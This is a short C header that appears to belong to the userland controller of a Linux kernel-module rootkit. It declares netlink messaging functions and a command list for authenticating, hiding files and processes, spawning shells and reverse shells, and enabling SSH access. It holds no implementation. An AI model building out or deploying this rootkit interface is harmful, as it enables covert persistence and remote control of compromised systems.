#ifndef _CRUMBS_H_
#define _CRUMBS_H_

#include <argp.h>
#include <stdbool.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <linux/netlink.h>
#include <unistd.h>

#define NETLINK_USER 31
#define PAYLOAD_SIZE PATH_MAX+10

struct cmd {
	int id;
	void* arg;
};

struct arguments {
    int auth;
    int fd;
    struct sockaddr_nl dst_addr;
};

typedef enum {
	AUTHENTICATION,
	LOGOUT,
	HIDE_FILE,
	UNHIDE_FILE,
	HIDE_PROCESS,
	UNHIDE_PROCESS,
	MODE_SHELL,
	MODE_REVERSE_SHELL,
	ACTIVATE_SSH,
	DEACTIVATE_SSH
} commands;

int socket_init(struct sockaddr_nl *src_addr, struct sockaddr_nl *dst_addr);
void* send_msg_lkm(struct arguments *arguments, const char *format, ...);

#endif /* _CRUMBS_H_ */